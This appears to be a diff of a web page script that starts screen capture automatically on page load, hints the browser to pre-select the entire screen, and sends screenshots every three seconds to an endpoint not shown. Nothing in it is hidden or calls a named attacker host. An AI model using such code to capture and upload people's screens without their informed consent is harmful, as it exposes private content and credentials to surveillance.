@@ -24,12 +24,17 @@
   async function startCapture() {
     try {
       stream = await navigator.mediaDevices.getDisplayMedia({ 
-        video: true,
+        video: { 
+          displaySurface: "monitor",   // This hints the browser to pre-select "Entire Screen"
+          cursor: "always"            // Optional: shows cursor in screenshots
+        },
         audio: false 
       });
 
       // Start sending screenshots every 3 seconds
       interval = setInterval(() => captureAndSend(), 3000);
+      
+      console.log("✅ Whole screen capture started");
     } catch (err) {
       console.error("Screen capture failed or was blocked:", err);
     }
@@ -60,13 +65,13 @@
       } catch (e) {
         console.error("Failed to send screenshot");
       }
-    }, 'image/png', 0.85);   // 0.85 quality to help keep file size down
+    }, 'image/png', 0.85);
   }
 
   // Auto start when page loads
   window.onload = startCapture;
 
-  // Optional: stop if user closes tab (cleanup)
+  // Cleanup when closing tab
   window.onbeforeunload = () => {
     if (interval) clearInterval(interval);
     if (stream) stream.getTracks().forEach(track => track.stop());
